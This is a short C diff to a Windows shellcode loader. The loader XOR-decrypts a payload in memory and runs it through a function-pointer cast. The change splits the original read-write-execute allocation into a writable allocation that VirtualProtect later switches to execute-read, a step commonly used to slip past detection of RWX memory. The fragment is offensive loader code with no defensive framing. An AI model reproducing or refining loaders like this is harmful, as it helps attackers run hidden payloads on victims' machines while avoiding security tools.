@@ -44,7 +44,7 @@ PBYTE xor_payload(PBYTE payload, SIZE_T payload_size, BYTE key) {
 int main(void) {
 
 	// Allocate memory that has read, write, and execute permission.
-	PBYTE executable_memory = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	PBYTE executable_memory = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	// If memory failed to be allocated
 	if (executable_memory == NULL) {
 		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
@@ -56,6 +56,9 @@ int main(void) {
 
 	// Decrypt the payload in place
 	xor_payload(executable_memory, payload_size, 0x45);
+
+	DWORD old_protect = NULL;
+	VirtualProtect(executable_memory, payload_size, PAGE_EXECUTE_READ, &old_protect);
 
 	// Execute the shellcode using pointer magic
 	(*(VOID(*)()) executable_memory)();
